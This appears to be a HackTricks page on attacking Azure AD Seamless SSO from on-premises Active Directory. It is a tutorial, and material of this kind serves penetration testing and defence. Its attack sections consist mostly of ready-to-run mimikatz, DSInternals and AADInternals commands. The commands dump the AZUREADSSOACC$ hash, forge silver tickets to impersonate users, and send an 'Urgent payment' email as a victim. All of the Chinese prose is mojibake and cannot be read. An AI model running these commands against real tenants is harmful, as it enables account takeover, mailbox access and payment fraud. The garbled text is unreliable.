# Az - æ— ç¼SSO

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

[æ¥è‡ªæ–‡æ¡£ï¼š](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directoryæ— ç¼å•ç‚¹ç™»å½•ï¼ˆAzure ADæ— ç¼SSOï¼‰ä¼šåœ¨ç”¨æˆ·ä½¿ç”¨è¿æ¥åˆ°æ‚¨å…¬å¸ç½‘ç»œçš„å…¬å¸è®¾å¤‡æ—¶**è‡ªåŠ¨ç™»å½•**ç”¨æˆ·ã€‚å¯ç”¨åï¼Œ**ç”¨æˆ·æ— éœ€è¾“å…¥å¯†ç å³å¯ç™»å½•Azure AD**ï¼Œé€šå¸¸ç”šè‡³æ— éœ€è¾“å…¥ç”¨æˆ·åã€‚æ­¤åŠŸèƒ½ä½¿æ‚¨çš„ç”¨æˆ·å¯ä»¥è½»æ¾è®¿é—®åŸºäºäº‘çš„åº”ç”¨ç¨‹åºï¼Œæ— éœ€ä»»ä½•é¢å¤–çš„æœ¬åœ°ç»„ä»¶ã€‚

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬ä¸Šï¼ŒAzure ADæ— ç¼SSOä¼šåœ¨ç”¨æˆ·**ä½¿ç”¨æœ¬åœ°åŸŸåŠ å…¥çš„PC**æ—¶**è‡ªåŠ¨ç™»å½•**ç”¨æˆ·ã€‚

å®ƒå—åˆ°[**PHSï¼ˆå¯†ç å“ˆå¸ŒåŒæ­¥ï¼‰**](phs-password-hash-sync.md)å’Œ[**PTAï¼ˆé€ä¼ èº«ä»½éªŒè¯ï¼‰**](pta-pass-through-authentication.md)çš„æ”¯æŒã€‚

æ¡Œé¢SSOä½¿ç”¨**Kerberos**è¿›è¡Œèº«ä»½éªŒè¯ã€‚é…ç½®åï¼ŒAzure AD Connectä¼šåœ¨æœ¬åœ°ADä¸­åˆ›å»ºä¸€ä¸ªåä¸º**AZUREADSSOACC`$`**çš„è®¡ç®—æœºå¸æˆ·ã€‚åœ¨é…ç½®è¿‡ç¨‹ä¸­ï¼Œ`AZUREADSSOACC$`å¸æˆ·çš„å¯†ç ä¼š**ä»¥æ˜æ–‡å½¢å¼å‘é€åˆ°Azure AD**ã€‚

**Kerberosç¥¨æ®**ä½¿ç”¨å¯†ç çš„**NTHashï¼ˆMD4ï¼‰**è¿›è¡ŒåŠ å¯†ï¼ŒAzure ADä½¿ç”¨å‘é€çš„å¯†ç æ¥è§£å¯†ç¥¨æ®ã€‚

**Azure AD**å…¬å¼€äº†ä¸€ä¸ªæ¥å—Kerberos**ç¥¨æ®**çš„**ç«¯ç‚¹**ï¼ˆhttps://autologon.microsoftazuread-sso.comï¼‰ã€‚åŸŸåŠ å…¥çš„è®¡ç®—æœºæµè§ˆå™¨ä¼šå°†ç¥¨æ®è½¬å‘åˆ°æ­¤ç«¯ç‚¹ä»¥è¿›è¡ŒSSOã€‚

### æœ¬åœ° -> äº‘

ç”¨æˆ·**`AZUREADSSOACC$`çš„å¯†ç æ°¸è¿œä¸ä¼šæ›´æ”¹**ã€‚å› æ­¤ï¼ŒåŸŸç®¡ç†å‘˜å¯ä»¥ç ´åæ­¤å¸æˆ·çš„**å“ˆå¸Œå€¼**ï¼Œç„¶åä½¿ç”¨å®ƒæ¥**åˆ›å»ºé“¶ç¥¨æ®**ä»¥ä¸**ä»»ä½•æœ¬åœ°ç”¨æˆ·åŒæ­¥**è¿æ¥åˆ°Azureï¼š
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifmâ€ "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
ä½¿ç”¨å“ˆå¸Œå€¼ï¼Œæ‚¨ç°åœ¨å¯ä»¥**ç”Ÿæˆé“¶ç¥¨æ®**ï¼š
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
è¦ä½¿ç”¨é“¶ç¥¨ï¼Œåº”æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š

1. **å¯åŠ¨æµè§ˆå™¨ï¼š**åº”å¯åŠ¨ Mozilla Firefoxã€‚
2. **é…ç½®æµè§ˆå™¨ï¼š**
   * è½¬åˆ° **`about:config`**ã€‚
   * å°† [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) çš„é¦–é€‰é¡¹è®¾ç½®ä¸ºæŒ‡å®šçš„ [values](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically)ï¼š
     * `https://aadg.windows.net.nsatc.net`
     * `https://autologon.microsoftazuread-sso.com`
3. **è®¿é—® Web åº”ç”¨ç¨‹åºï¼š**
   * è®¿é—®å·²ä¸ç»„ç»‡çš„ AAD åŸŸé›†æˆçš„ Web åº”ç”¨ç¨‹åºã€‚ä¸€ä¸ªå¸¸è§ç¤ºä¾‹æ˜¯ [Office 365](https://portal.office.com/)ã€‚
4. **èº«ä»½éªŒè¯è¿‡ç¨‹ï¼š**
   * åœ¨ç™»å½•å±å¹•ä¸Šï¼Œè¾“å…¥ç”¨æˆ·åï¼Œå°†å¯†ç å­—æ®µç•™ç©ºã€‚
   * è¦ç»§ç»­ï¼Œè¯·æŒ‰ TAB é”®æˆ– ENTER é”®ã€‚

{% hint style="success" %}
å¦‚æœå¯ç”¨äº† MFAï¼Œæ­¤æ–¹æ³•æ— æ³•ç»•è¿‡
{% endhint %}

#### ~~ä¸ºä»…äº‘ç”¨æˆ·åˆ›å»º Kerberos ç¥¨è¯~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

å¦‚æœ Active Directory ç®¡ç†å‘˜å¯ä»¥è®¿é—® Azure AD Connectï¼Œåˆ™å¯ä»¥ä¸ºä»»ä½•äº‘ç”¨æˆ·**è®¾ç½® SID**ã€‚è¿™æ ·ï¼ŒKerberos **ç¥¨è¯ä¹Ÿå¯ä»¥ä¸ºä»…äº‘ç”¨æˆ·åˆ›å»º**ã€‚å”¯ä¸€çš„è¦æ±‚æ˜¯ SID å¿…é¡»æ˜¯æ­£ç¡®çš„ [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\))ã€‚

{% hint style="danger" %}
ç°åœ¨**Microsoft å·²é˜»æ­¢æ›´æ”¹**ä»…äº‘ç®¡ç†å‘˜ç”¨æˆ·çš„ SIDã€‚\
æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
{% endhint %}

### ä»æœ¬åœ° -> é€šè¿‡åŸºäºèµ„æºçš„å—é™å§”æ´¾åˆ°äº‘ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

ä»»ä½•å¯ä»¥ç®¡ç†ä½äºæ­¤å¸æˆ·æ‰€åœ¨å®¹å™¨æˆ– OU ä¸­çš„è®¡ç®—æœºå¸æˆ·ï¼ˆ`AZUREADSSOACC$`ï¼‰çš„äººï¼Œéƒ½å¯ä»¥**é…ç½®åŸºäºèµ„æºçš„å—é™å§”æ´¾ä»¥è®¿é—®è¯¥å¸æˆ·**ã€‚
```python
python rbdel.py -u <workgroup>\\<user> -p <pass> <ip> azureadssosvc$
```
## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚ 

</details>
